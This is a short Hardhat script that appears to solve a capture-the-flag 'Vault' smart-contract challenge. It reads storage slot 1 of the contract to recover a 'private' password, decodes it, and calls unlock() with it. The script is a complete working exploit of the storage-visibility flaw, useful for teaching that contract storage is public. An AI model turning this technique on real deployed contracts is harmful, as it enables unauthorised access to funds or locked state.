import { ethers } from 'hardhat';

const CONTRACT_ADDRESS = '0xeF8653ffb270961153fC955063ABc1AeAe0Cc37b';
const PLAYER_ADDRESS = '0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199';

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);

  const contract = await ethers.getContractAt(
    'Vault',
    CONTRACT_ADDRESS,
    signer,
  );

  // get storage at contract address
  const password = await contract.provider.getStorageAt(CONTRACT_ADDRESS, 1);

  // convert the password from hex to ascii
  const passwordAscii = ethers.utils.toUtf8String(password);

  // console log the ascii password
  console.log('Password found:', passwordAscii);

  // unlock the vault
  const tx = await contract.unlock(password);

  console.log('Vault is locked:', await contract.locked());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
